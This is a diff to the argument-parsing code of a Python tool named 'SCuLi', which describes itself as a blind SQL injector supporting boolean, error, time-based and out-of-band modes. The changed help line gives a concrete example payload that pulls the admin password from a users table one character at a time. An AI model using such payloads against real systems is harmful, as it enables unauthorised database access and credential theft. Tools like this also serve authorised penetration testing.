@@ -22,7 +22,7 @@ parser = argparse.ArgumentParser(prog='SCuLi', description="A blind SQL Injector
 parser.add_argument("URL")
 parser.add_argument("type", help="Can be: basic, error, time, xOAST")
 parser.add_argument("method", help="Can be: GET or POST")
-parser.add_argument("payload", help="Example: `' AND SUBSTR((SELECT <data> FROM <table> WHERE <filter>='<value>'),<index>,1)='<char>'--`")
+parser.add_argument("payload", help="Example: `' AND SUBSTR((SELECT passwd FROM users WHERE uname='admin'),<index>,1)='<char>'--`")
 parser.add_argument("-d", "--delay", help="In seconds. Example: `0.5`")
 parser.add_argument("--cookie", help="Example: `PHPSESSID=JWT; csrf=MD5-STUFF`")
 parser.add_argument("--proxy", help="Example: `http://127.0.0.1:8080`")
